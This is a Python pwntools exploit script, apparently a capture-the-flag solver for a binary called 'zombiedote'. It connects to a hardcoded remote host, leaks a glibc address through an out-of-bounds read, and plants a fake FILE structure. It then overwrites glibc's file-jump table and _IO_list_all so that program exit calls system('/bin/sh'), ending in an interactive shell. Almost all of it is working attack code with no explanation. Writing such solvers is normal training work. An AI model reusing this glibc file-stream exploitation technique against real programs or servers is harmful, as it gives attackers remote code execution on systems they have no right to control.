#!/usr/bin/env python3
import struct
from pwn import *
#context.terminal = ['tmux', 'splitw']        # horizontal split
#context.terminal = ['tmux', 'splitw', '-h']  # vertical split
context.terminal = ['gnome-terminal', '-e']   # new terminal

DEBUG = os.getenv('DEBUG', '0') == '1'
REMOTE = os.getenv('REMOTE', '0') == '1'

r = remote('94.237.59.206', 48167)
# REMOTE=1 && python solver.py

def genlist(d, _max=None):
  m = max(d.keys()) if _max is None else _max
  lst = []
  for idx in range(0, m+1, 8):
    if idx in d.keys():
      if isinstance(d[idx], int): lst.append(d[idx])
      elif isinstance(d[idx], bytes): lst.append(u64(d[idx].ljust(8, b'\x00')))
      else: raise Exception(f'[!] Unsupported type by genlist(): {type(d[idx])}')
    else:
      lst.append(0)
  return lst

# there has to be a better way
def val2double(x):
  return str(struct.unpack("d", p64(x))[0]).encode()

def double2val(x):
    return struct.unpack('<Q', struct.pack('<d', x))[0]

def exploit():
  _bin = './zombiedote'
  elf = ELF(_bin, checksec=False)
  libc = ELF('./glibc/libc.so.6', checksec=False)
  context.binary = _bin
  script = '''c'''

  if DEBUG: r = gdb.debug(_bin, gdbscript=script)
  elif REMOTE: r = remote('localhost', 1337)
  else: r = elf.process()

  # *Thicc* Create
  # mmap handles it - sits before libc in virtual memory
  r.sendlineafter(b'>> ', b'1')
  r.sendlineafter(b': ', str(0x1000000//8).encode())

  # Inspect - GLibc leak
  if REMOTE: off = 0x1003ff0  # docker offset (chunk to libc base when mmaped)
  else: off = 0x1000ff0       # local offset
  leak_target = off + libc.sym._IO_2_1_stdout_ + 0x8
  assert off%8 == 0, "Cannot div off by 8"
  r.sendlineafter(b'>> ', b'5')
  r.sendlineafter(b'inspect: ', str(leak_target//8).encode())
  r.recvuntil(b'): ')
  libc.address = double2val(float(r.recvline())) - 0x2197e3

  __GI__IO_file_jumps = libc.sym.__GI__IO_file_jumps
  _IO_list_all = libc.sym._IO_list_all
  system = libc.sym.system
  print('\nGlibc Addresses Calculated:\n'
        f'               libc @ {hex(libc.address)}\n'
        f'__GI__IO_file_jumps @ {hex(__GI__IO_file_jumps)}\n'
        f'       _IO_list_all @ {hex(_IO_list_all)}\n'
        f'      __libc_system @ {hex(system)}\n')

  chunk_addr = libc.address - off
  print(f'heap chunk @ {hex(chunk_addr)}')

  # not all fields need to be filled - README for offsets
  # populating (_flags), _IO_write_base, _IO_write_ptr, and *vtable*
  # "/bin/sh\x00" @ chunk addr
  fakeFILE = {
    0x00: b'/bin/sh\x00',
    0x20: 0x01,  # _IO_write_base -> must set ptr > base
    0x28: 0x02,  # _IO_write_ptr
    0xc4+20: __GI__IO_file_jumps # FILE vtable
  }
  fakeFILE = list(map(val2double, genlist(fakeFILE)))

  # Insert - Place fake FILE on chunk
  r.sendlineafter(b'>> ', b'2')
  r.sendlineafter(b': ', str(len(fakeFILE)).encode())
  for val in fakeFILE: r.sendlineafter(b'): ', val)

  # __GI__IO_file_jumps' __overflow() ptr overwrite
  # __GI__IO_file_jumps+0x18 -> system
  # _IO_list_all -> chunk w/ fake FILE
  writes = [(__GI__IO_file_jumps+0x18, system),
            (_IO_list_all, chunk_addr)]

  # Offsets relative to chunk addr
  writes = [(key-chunk_addr, val) for key, val in writes]
  assert all([w[0]%8 == 0 for w in writes]), "Cannot div write by 8"

  # Edit twice - GLibc overwrites
  for w in writes:
    r.sendlineafter(b'>> ', b'4')
    r.sendlineafter(b': ', str(w[0]//8).encode()) # addr
    r.sendlineafter(b'): ', val2double(w[1]))  # overwrite value

  # delete to exit and trigger exploit
  # system("/bin/sh") call
  r.sendlineafter(b'>> ', b'3')
  r.recv() # cleanup
  print('** SHELL **')
  r.interactive()

if __name__ == '__main__':
  exploit()
